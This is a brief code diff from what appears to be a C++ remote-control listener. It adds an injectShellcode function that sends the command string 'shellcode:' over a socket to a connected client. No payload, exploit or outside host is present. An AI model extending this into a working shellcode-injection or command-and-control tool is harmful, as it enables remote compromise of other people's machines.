@@ -160,3 +160,9 @@ int listener::uploadFile(string l_path, string r_path) {
 	}
 	printf("Finished Uploading!\n");
 }
+
+int listener::injectShellcode() {
+	printf("Injecting Shellcode...\n");
+	string cmd = "shellcode:";
+	send(new_fd, cmd.c_str(), cmd.length(), 0);
+}
